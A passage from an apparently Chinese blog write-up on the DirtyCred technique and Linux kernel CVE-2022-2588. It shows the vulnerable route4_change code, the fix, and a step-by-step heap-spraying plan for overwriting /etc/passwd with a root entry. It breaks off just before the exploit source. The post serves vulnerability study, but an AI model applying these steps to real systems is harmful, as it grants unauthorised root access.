<span class="number">512</span>    <span class="number">1</span> : tunables    <span class="number">0</span>    <span class="number">0</span>    <span class="number">0</span> : sl0</span><br><span class="line">kmalloc<span class="number">-8</span>k           <span class="number">244</span>    <span class="number">244</span>   <span class="number">8192</span>    <span class="number">4</span>    <span class="number">8</span> : tunables    <span class="number">0</span>    <span class="number">0</span>    <span class="number">0</span> : sl0</span><br><span class="line">kmalloc<span class="number">-4</span>k          <span class="number">1860</span>   <span class="number">1872</span>   <span class="number">4096</span>    <span class="number">8</span>    <span class="number">8</span> : tunables    <span class="number">0</span>    <span class="number">0</span>    <span class="number">0</span> : sl0</span><br><span class="line">kmalloc<span class="number">-2</span>k          <span class="number">2384</span>   <span class="number">2384</span>   <span class="number">2048</span>   <span class="number">16</span>    <span class="number">8</span> : tunables    <span class="number">0</span>    <span class="number">0</span>    <span class="number">0</span> : sl0</span><br><span class="line">kmalloc<span class="number">-1</span>k          <span class="number">2968</span>   <span class="number">3008</span>   <span class="number">1024</span>   <span class="number">32</span>    <span class="number">8</span> : tunables    <span class="number">0</span>    <span class="number">0</span>    <span class="number">0</span> : sl0</span><br><span class="line">kmalloc<span class="number">-512</span>        <span class="number">52767</span>  <span class="number">52768</span>    <span class="number">512</span>   <span class="number">32</span>    <span class="number">4</span> : tunables    <span class="number">0</span>    <span class="number">0</span>    <span class="number">0</span> : sl0</span><br><span class="line">kmalloc<span class="number">-256</span>         <span class="number">8879</span>   <span class="number">8960</span>    <span class="number">256</span>   <span class="number">32</span>    <span class="number">2</span> : tunables    <span class="number">0</span>    <span class="number">0</span>    <span class="number">0</span> : sl0</span><br><span class="line">kmalloc<span class="number">-192</span>         <span class="number">3486</span>   <span class="number">3486</span>    <span class="number">192</span>   <span class="number">42</span>    <span class="number">2</span> : tunables    <span class="number">0</span>    <span class="number">0</span>    <span class="number">0</span> : sl0</span><br><span class="line">kmalloc<span class="number">-128</span>         <span class="number">3419</span>   <span class="number">3424</span>    <span class="number">128</span>   <span class="number">32</span>    <span class="number">1</span> : tunables    <span class="number">0</span>    <span class="number">0</span>    <span class="number">0</span> : sl0</span><br><span class="line">kmalloc<span class="number">-96</span>          <span class="number">5482</span>   <span class="number">5754</span>     <span class="number">96</span>   <span class="number">42</span>    <span class="number">1</span> : tunables    <span class="number">0</span>    <span class="number">0</span>    <span class="number">0</span> : sl0</span><br><span class="line">kmalloc<span class="number">-64</span>         <span class="number">18368</span>  <span class="number">18368</span>     <span class="number">64</span>   <span class="number">64</span>    <span class="number">1</span> : tunables    <span class="number">0</span>    <span class="number">0</span>    <span class="number">0</span> : sl0</span><br><span class="line">kmalloc<span class="number">-32</span>         <span class="number">33152</span>  <span class="number">33152</span>     <span class="number">32</span>  <span class="number">128</span>    <span class="number">1</span> : tunables    <span class="number">0</span>    <span class="number">0</span>    <span class="number">0</span> : sl0</span><br><span class="line">kmalloc<span class="number">-16</span>         <span class="number">16640</span>  <span class="number">16640</span>     <span class="number">16</span>  <span class="number">256</span>    <span class="number">1</span> : tunables    <span class="number">0</span>    <span class="number">0</span>    <span class="number">0</span> : sl0</span><br><span class="line">kmalloc<span class="number">-8</span>          <span class="number">15872</span>  <span class="number">15872</span>      <span class="number">8</span>  <span class="number">512</span>    <span class="number">1</span> : tunables    <span class="number">0</span>    <span class="number">0</span>    <span class="number">0</span> : sl0</span><br><span class="line">kmem_cache_node      <span class="number">576</span>    <span class="number">576</span>     <span class="number">64</span>   <span class="number">64</span>    <span class="number">1</span> : tunables    <span class="number">0</span>    <span class="number">0</span>    <span class="number">0</span> : sl0</span><br><span class="line">kmem_cache           <span class="number">384</span>    <span class="number">384</span>    <span class="number">256</span>   <span class="number">32</span>    <span class="number">2</span> : tunables    <span class="number">0</span>    <span class="number">0</span>    <span class="number">0</span> : sl0</span><br></pre></td></tr></table></figure>
<ul>
<li><code>generic cache</code>：在名称中带有 <code>kmalloc</code></li>
<li><code>dedicated cache</code>：拥有特殊的名字</li>
</ul>
<p><strong>Dirty Cred 漏洞利用</strong></p>
<p>大致步骤：</p>
<ul>
<li>释放存在漏洞的非特权凭据</li>
<li>在释放的内存插槽中分配特权凭据</li>
<li>以特权用户身份操作</li>
</ul>
<p>具体步骤：（本例是采用 <code>file</code> 对象完成利用，也可以采用 <code>cred</code> 对象）</p>
<ul>
<li>打开可写的文件 <code>/tmp/x</code>，就会分配可写的 <code>file</code> 对象，在通过写许可检查之后后，进行实际写操作之前暂停</li>
<li>利用漏洞释放该 <code>file</code> 对象</li>
<li>打开只读文件 <code>/etc/passwd</code>，就会分配新的 <code>file</code> 对象，占据旧的 <code>file</code> 对象，继续写入就能往只读文件写入内容（例如写入 <code>hacker:x:0:0:root:/:/bin/sh</code> 就能提权）</li>
</ul>
<p>CVE-2022-2588 漏洞点：</p>
<ul>
<li>将 <code>route4_filter</code> 对象从链表中删除和释放时的检查条件不一致</li>
<li>导致该对象被释放后仍存于链表中</li>
</ul>
<p>安装 Kernel：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">wget https://mirrors.tuna.tsinghua.edu.cn/kernel/v5.x/linux-5.19.1.tar.xz</span><br><span class="line">tar -xvf linux-5.19.1.tar.xz</span><br><span class="line">make menuconfig</span><br><span class="line">make x86_64_defconfig</span><br><span class="line">make bzImage -j32</span><br></pre></td></tr></table></figure>
<ul>
<li>怕麻烦的可以在如下网站中下载：<a target="_blank" rel="noopener" href="https://github.com/bsauce/kernel-exploit-factory/tree/main/CVE-2022-2588">kernel-exploit-factory/CVE-2022-2588 at main · bsauce/kernel-exploit-factory (github.com)</a> </li>
</ul>
<p>编译选项：</p>
<ul>
<li><strong>CONFIG_BINFMT_MISC=y</strong> （否则启动VM时报错）</li>
<li><strong>CONFIG_USER_NS=y</strong> （触发漏洞需要 User Namespace）</li>
<li><strong>CONFIG_NET_CLS_ROUTE4=y</strong> （漏洞函数所在的模块）</li>
<li><strong>CONFIG_DUMMY=y</strong> <strong>CONFIG_NET_SCH_QFQ=y</strong> （breezeO_o 提供的两个编译选项，触发 poc 需要用到）</li>
<li><strong>CONFIG_NET_CLS_ACT=y</strong> / <strong>CONFIG_NET_CLS_BASIC=y</strong> （默认已开启）</li>
<li><strong>CONFIG_NET_SCH_SFQ=y</strong> （exp 中触发漏洞需用到 sfq 随机公平队列）</li>
<li><strong>CONFIG_NET_EMATCH_META=y</strong> （exp 中堆喷对象时需要用到）</li>
</ul>
<p>Dirty Cred 所面对的挑战：</p>
<ol>
<li>如何将内存破坏漏洞，转换为能够置换 <code>file object</code> 的原语</li>
<li>如何延长文件的 权限检查-数据写入 的竞争窗口</li>
<li>如何创建高权限的 <code>file object</code>，来占据先前被释放的低权限 <code>file object</code> 内存空洞</li>
</ol>
<p>对应的解决措施：</p>
<ol>
<li>置换 <code>file object</code>：<ul>
<li>Out Of Bound Write：尝试越界写入下一个结构体的凭证字段，将其替换为高权限的凭证（例如：<code>request_key_auth-&gt;cred</code>）</li>
<li>Use After Free：使用高权限的凭证来“占据”低权限的凭证</li>
<li>Double Free：最终可以达到两个指针共同指向一个凭证的效果 </li>
</ul>
</li>
<li>延长竞争窗口：<ul>
<li>Userfaultfd：在多线程程序中，userfaultfd 允许一个线程管理其他线程所产生的 Page Fault 事件，当某个线程触发了 Page Fault，该线程将立即睡眠，而其他线程则可以通过 userfaultfd 来读取出这个 Page Fault 事件，并进行处理</li>
<li>FUSE：一个用户层文件系统框架，允许用户实现自己的文件系统，用户可以在该框架中注册 handler，来指定应对文件操作请求（可以在实际操作文件之前，执行 handler 暂停内核执行，尽可能地延长窗口）</li>
<li>File Lock：使用锁定暂停内核执行</li>
</ul>
</li>
<li>分配特权对象：<ul>
<li>大量执行 Set-UID 程序（例如 sudo），或者频繁创建特权级守护进程（例如 sshd），从而创建 privilege cred 结构体</li>
<li>使用 ReadOnly 方式来打开诸如 <code>/etc/passwd</code> 等特权文件</li>
<li>当内核创建新的 <code>kernel thread</code> 时，当前 <code>kernel thread</code> 将会被复制，于此同时其 <code>privileged cred</code> 结构体也会被拷贝一份</li>
</ul>
</li>
</ol>
<p>接下来看一看关键的代码：</p>
<ul>
<li><code>route4_filter</code> 对象：（大小为“144”，属于 <code>kmalloc-192</code> ）</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">route4_filter</span> &#123;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">route4_filter</span> __<span class="title">rcu</span>	*<span class="title">next</span>;</span></span><br><span class="line">	u32			id;</span><br><span class="line">	<span class="keyword">int</span>			iif;</span><br><span class="line"></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">tcf_result</span>	<span class="title">res</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">tcf_exts</span>		<span class="title">exts</span>;</span></span><br><span class="line">	u32			handle;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">route4_bucket</span>	*<span class="title">bkt</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">tcf_proto</span>	*<span class="title">tp</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">rcu_work</span>		<span class="title">rwork</span>;</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<ul>
<li><code>tcf_exts</code> 对象的 <code>tc_action</code> 条目：（包含32个 <code>tc_action</code> 对象指针，属于 <code>kmalloc-256</code>）</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">tcf_exts</span> &#123;</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_NET_CLS_ACT</span></span><br><span class="line">	__u32	type; <span class="comment">/* for backward compat(TCA_OLD_COMPAT) */</span></span><br><span class="line">	<span class="keyword">int</span> nr_actions;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">tc_action</span> **<span class="title">actions</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">net</span> *<span class="title">net</span>;</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">	<span class="comment">/* Map to export classifier specific extension TLV types to the</span></span><br><span class="line"><span class="comment">	 * generic extensions API. Unsupported extensions must be set to 0.</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	<span class="keyword">int</span> action;</span><br><span class="line">	<span class="keyword">int</span> police;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<ul>
<li>有漏洞的代码：</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">route4_change</span><span class="params">(struct net *net, struct sk_buff *in_skb,</span></span></span><br><span class="line"><span class="params"><span class="function">			 struct tcf_proto *tp, <span class="keyword">unsigned</span> <span class="keyword">long</span> base, u32 handle,</span></span></span><br><span class="line"><span class="params"><span class="function">			 struct nlattr **tca, <span class="keyword">void</span> **arg, <span class="keyword">bool</span> ovr,</span></span></span><br><span class="line"><span class="params"><span class="function">			 <span class="keyword">bool</span> rtnl_held, struct netlink_ext_ack *extack)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">route4_head</span> *<span class="title">head</span> =</span> rtnl_dereference(tp-&gt;root);</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">route4_filter</span> __<span class="title">rcu</span> **<span class="title">fp</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">route4_filter</span> *<span class="title">fold</span>, *<span class="title">f1</span>, *<span class="title">pfp</span>, *<span class="title">f</span> =</span> <span class="literal">NULL</span>;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">route4_bucket</span> *<span class="title">b</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">nlattr</span> *<span class="title">opt</span> =</span> tca[TCA_OPTIONS];</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">nlattr</span> *<span class="title">tb</span>[<span class="title">TCA_ROUTE4_MAX</span> + 1];</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span> h, th;</span><br><span class="line">	<span class="keyword">int</span> err;</span><br><span class="line">	<span class="keyword">bool</span> <span class="keyword">new</span> = <span class="literal">true</span>;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (opt == <span class="literal">NULL</span>)</span><br><span class="line">		<span class="keyword">return</span> handle ? -EINVAL : <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">	err = nla_parse_nested_deprecated(tb, TCA_ROUTE4_MAX, opt,</span><br><span class="line">					  route4_policy, <span class="literal">NULL</span>);</span><br><span class="line">	<span class="keyword">if</span> (err &lt; <span class="number">0</span>)</span><br><span class="line">		<span class="keyword">return</span> err;</span><br><span class="line"></span><br><span class="line">	fold = *arg; <span class="comment">/* 现有的route4_filter对象 */</span></span><br><span class="line">	<span class="keyword">if</span> (fold &amp;&amp; handle &amp;&amp; fold-&gt;handle != handle)</span><br><span class="line">			<span class="keyword">return</span> -EINVAL;</span><br><span class="line"></span><br><span class="line">	err = -ENOBUFS;</span><br><span class="line">	f = kzalloc(<span class="keyword">sizeof</span>(struct route4_filter), GFP_KERNEL); <span class="comment">/* 分配新的route4_filter对象 */</span></span><br><span class="line">	<span class="keyword">if</span> (!f)</span><br><span class="line">		<span class="keyword">goto</span> errout;</span><br><span class="line"></span><br><span class="line">	err = tcf_exts_init(&amp;f-&gt;exts, net, TCA_ROUTE4_ACT, TCA_ROUTE4_POLICE); <span class="comment">/* 进行初始化,为route4_filter-&gt;exts.action分配256字节的空间 */</span></span><br><span class="line">	<span class="keyword">if</span> (err &lt; <span class="number">0</span>)</span><br><span class="line">		<span class="keyword">goto</span> errout;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (fold) &#123; <span class="comment">/* 把旧的route4_filter对象中的数据填入新的route4_filter对象 */</span></span><br><span class="line">		f-&gt;id = fold-&gt;id;</span><br><span class="line">		f-&gt;iif = fold-&gt;iif;</span><br><span class="line">		f-&gt;res = fold-&gt;res;</span><br><span class="line">		f-&gt;handle = fold-&gt;handle;</span><br><span class="line"></span><br><span class="line">		f-&gt;tp = fold-&gt;tp;</span><br><span class="line">		f-&gt;bkt = fold-&gt;bkt;</span><br><span class="line">		<span class="keyword">new</span> = <span class="literal">false</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	err = route4_set_parms(net, tp, base, f, handle, head, tb,</span><br><span class="line">			       tca[TCA_RATE], <span class="keyword">new</span>, ovr, extack); <span class="comment">/* 初始化new filter */</span></span><br><span class="line">	<span class="keyword">if</span> (err &lt; <span class="number">0</span>)</span><br><span class="line">		<span class="keyword">goto</span> errout;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* 将new filter插入到list */</span></span><br><span class="line">	h = from_hash(f-&gt;handle &gt;&gt; <span class="number">16</span>);</span><br><span class="line">	fp = &amp;f-&gt;bkt-&gt;ht[h];</span><br><span class="line">	<span class="keyword">for</span> (pfp = rtnl_dereference(*fp);</span><br><span class="line">         (f1 = rtnl_dereference(*fp)) != <span class="literal">NULL</span>;</span><br><span class="line">         fp = &amp;f1-&gt;next)</span><br><span class="line">		<span class="keyword">if</span> (f-&gt;handle &lt; f1-&gt;handle)</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">	tcf_block_netif_keep_dst(tp-&gt;chain-&gt;block);</span><br><span class="line">	rcu_assign_pointer(f-&gt;next, f1);</span><br><span class="line">	rcu_assign_pointer(*fp, f);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* 若存在old filter,old handle不为&quot;0&quot;,old new handle不同,则从list中移除 */</span></span><br><span class="line">	<span class="keyword">if</span> (fold &amp;&amp; fold-&gt;handle &amp;&amp; f-&gt;handle != fold-&gt;handle) &#123;</span><br><span class="line">		th = to_hash(fold-&gt;handle);</span><br><span class="line">		h = from_hash(fold-&gt;handle &gt;&gt; <span class="number">16</span>);</span><br><span class="line">		b = rtnl_dereference(head-&gt;table[th]);</span><br><span class="line">		<span class="keyword">if</span> (b) &#123;</span><br><span class="line">			fp = &amp;b-&gt;ht[h]; <span class="comment">/* ht存放的是route4_filter列表 */</span></span><br><span class="line">			<span class="keyword">for</span> (pfp = rtnl_dereference(*fp); pfp;</span><br><span class="line">			     fp = &amp;pfp-&gt;next, pfp = rtnl_dereference(*fp)) &#123;</span><br><span class="line">				<span class="keyword">if</span> (pfp == fold) &#123;</span><br><span class="line">					rcu_assign_pointer(*fp, fold-&gt;next); <span class="comment">/* 从链表中删除 */</span></span><br><span class="line">					<span class="keyword">break</span>;</span><br><span class="line">				&#125;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	route4_reset_fastmap(head);</span><br><span class="line">	*arg = f;</span><br><span class="line">	<span class="keyword">if</span> (fold) &#123; <span class="comment">/* 若存在old filter,释放old filter */</span></span><br><span class="line">		tcf_unbind_filter(tp, &amp;fold-&gt;res);</span><br><span class="line">		tcf_exts_get_net(&amp;fold-&gt;exts);</span><br><span class="line">		tcf_queue_work(&amp;fold-&gt;rwork, route4_delete_filter_work); <span class="comment">/* 启动内核任务,调用route4_delete_filter_work释放old filter */</span></span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">errout:</span><br><span class="line">	<span class="keyword">if</span> (f)</span><br><span class="line">		tcf_exts_destroy(&amp;f-&gt;exts);</span><br><span class="line">	kfree(f);</span><br><span class="line">	<span class="keyword">return</span> err;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>使用 <code>handle</code> 作为 ID 来区分不同的 <code>route4_filter</code></li>
<li>如果存在某个 <code>handle</code> 之前已被初始化过（<code>fold</code> 变量非空），就会移除旧的 <code>filter</code>，添加新的 <code>filter</code></li>
<li>否则直接添加新的 <code>filter</code></li>
</ul>
<p>这里可以发现，将 <code>route4_filter</code> 对象从链表中删除和释放时的检查条件不一致：</p>
<ul>
<li>从链表中删除的条件：<ul>
<li>存在 <code>old filter</code></li>
<li><code>old handle</code> 不为 “0”</li>
<li><code>old new handle</code> 不同</li>
</ul>
</li>
<li>从链表中释放的条件：<ul>
<li>存在 <code>old filter</code></li>
</ul>
</li>
</ul>
<p>如果 <code>old handle == 0</code>，则不会在链表中删除但是会被释放，这就导致了一个 UAF</p>
<p>漏洞利用的思路为：</p>
<p><strong>cross-cache</strong>：我们将释放某个 <code>kmalloc-256 cache page</code>，将该页归还给页管理器，然后分配 <code>file</code> 结构来复用该页（<code>filp cache</code>）</p>
<ul>
<li>分配一堆 <code>kmalloc-256</code> 堆块，包含漏洞对象</li>
<li>利用漏洞第1次释放漏洞对象，并释放一堆 <code>kmalloc-256</code>，以归还漏洞对象所在的页</li>
<li>分配大量低权限 <code>file</code> 对象来占据漏洞对象（cross-cache attack）</li>
<li>利用漏洞第2次释放漏洞对象（低权限 <code>file</code> 对象被释放）</li>
<li>堆喷高权限 <code>file</code> 对象来替换低权限 <code>file</code> 对象</li>
<li>利用 UAF 控制高权限 <code>file</code> 对象</li>
</ul>
<p>补丁：</p>
<figure class="highlight diff"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">diff --git a/net/sched/cls_route.c b/net/sched/cls_route.c</span></span><br><span class="line"><span class="comment">index a35ab8c27866e..3f935cbbaff66 100644</span></span><br><span class="line"><span class="comment">--- a/net/sched/cls_route.c</span></span><br><span class="line"><span class="comment">+++ b/net/sched/cls_route.c</span></span><br><span class="line"><span class="meta">@@ -526,7 +526,7 @@</span> static int route4_change(struct net *net, struct sk_buff *in_skb,</span><br><span class="line">    rcu_assign_pointer(f-&gt;next, f1);</span><br><span class="line">    rcu_assign_pointer(*fp, f);</span><br><span class="line"></span><br><span class="line"><span class="deletion">-   if (fold &amp;&amp; fold-&gt;handle &amp;&amp; f-&gt;handle != fold-&gt;handle) &#123;</span></span><br><span class="line"><span class="addition">+   if (fold) &#123;</span></span><br><span class="line">        th = to_hash(fold-&gt;handle);</span><br><span class="line">        h = from_hash(fold-&gt;handle &gt;&gt; 16);</span><br><span class="line">        b = rtnl_dereference(head-&gt;table[th]);</span><br></pre></td></tr></table></figure>
<p><strong>Dirty Cred 漏洞复现</strong></p>
<div class="table-container">
<table>
<thead>
<tr>
<th>进程1</th>
<th>进程2</th>
</tr>
</thead>
<tbody>
<tr>
<td>0. 绑定到 CPU 0 上运行，设置子进程内存、工作目录、Namespace，启动进程2</td>
<td></td>
</tr>
<tr>
<td>1. 去碎片化，打开10000个文件，消耗 filp cache，为 cross-cache 作准备</td>
<td></td>
</tr>
<tr>
<td>2. 喷射 (middle+3)*32 kmalloc-192 &amp; kmalloc-256（和漏洞对象位于同一cache，便于进行 cross-cache 被 file 对象复用）</td>
<td></td>
</tr>
<tr>
<td></td>
<td>3. 分配1个 route4_filter 漏洞对象，还有1个kmalloc-256 的漏洞对象</td>
</tr>
<tr>
<td>4. 再喷射 (end-middle-2)*32 kmalloc-192 &amp; kmalloc-256</td>
<td></td>
</tr>
<tr>
<td>5. 释放 (end-24)*32 kmalloc-192 &amp; kmalloc-256</td>
<td></td>
</tr>
<tr>
<td></td>
<td>6. 第1次释放漏洞对象 kmalloc-192 &amp; kmalloc-256</td>
</tr>
<tr>
<td>7. 释放 (end-middle+1) kmalloc-192 &amp; kmalloc-256（避免连续释放同一对象，触发内核 double-free 的检测）</td>
<td></td>
</tr>
<tr>
<td></td>
<td>8. 喷射 4000 个低权限 file 对象（通过打开 exp_dir/data 文件）</td>
</tr>
<tr>
<td></td>
<td>9. 第2次释放漏洞对象 kmalloc-192 &amp; kmalloc-256</td>
</tr>
<tr>
<td></td>
<td>10. 喷射 5000 个低权限 file 对象，采用 kcmp 调用检查是否和前 4000 个 file 重合，重合的两个 file 记为 overlap_a / overlap_b</td>
</tr>
<tr>
<td></td>
<td>11. 发起3个利用线程，线程1写入大量数据来占用文件锁，线程2往 overlap_a 写入恶意数据</td>
</tr>
<tr>
<td>12. 线程3关闭 overlap_a / overlap_b，喷射 4096*2 个高权限 file 对象（通过打开 /etc/passwd 文件），未区分CPU</td>
<td></td>
</tr>
<tr>
<td></td>
<td>13. 最后检查 /etc/passwd 文件是否被写入恶意数据</td>
</tr>
</tbody>
</table>
</div>
<p>完整 exp 如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span 